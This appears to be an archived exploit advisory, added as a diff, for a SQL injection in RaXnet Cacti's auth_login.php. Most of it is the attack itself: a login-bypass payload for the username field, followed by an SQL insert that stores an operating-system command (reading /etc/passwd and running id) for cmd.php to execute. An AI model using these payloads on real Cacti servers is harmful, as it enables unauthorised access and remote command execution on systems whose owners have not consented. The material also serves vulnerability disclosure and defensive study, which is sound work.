@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/10960/info
+
+RaXnet Cacti is reportedly affected by a remote SQL injection vulnerability. This issue occurs in the auth_login.php script due to a failure of the application to properly sanitize user-supplied "username" URI parameter input before using it in an SQL query.
+
+It is demonstrated that an attacker may exploit this vulnerability in order to bypass the authentication interface used by Cacti.
+
+username = admin' or '6'='6
+password = password wished
+
+insert into data_input_data_cache (local_data_id, host_id,
+data_input_id, action, command, hostname, snmp_community,
+snmp_version, snmp_username, snmp_password, snmp_port, snmp_timeout,
+rrd_name, rrd_path, rrd_num, arg1, arg2, arg3)
+values ('9', '1', '7', '1', 'cat /etc/passwd;id;somecommand; some
+script', '127.0.0.1', '', '1', '', '', '161', '500',
+'hack', '/', '3', 'NULL', 'NULL', 'NULL');
+
+Then points to http://www.example.com/cacti/cmd.php and the command will be
+executed.
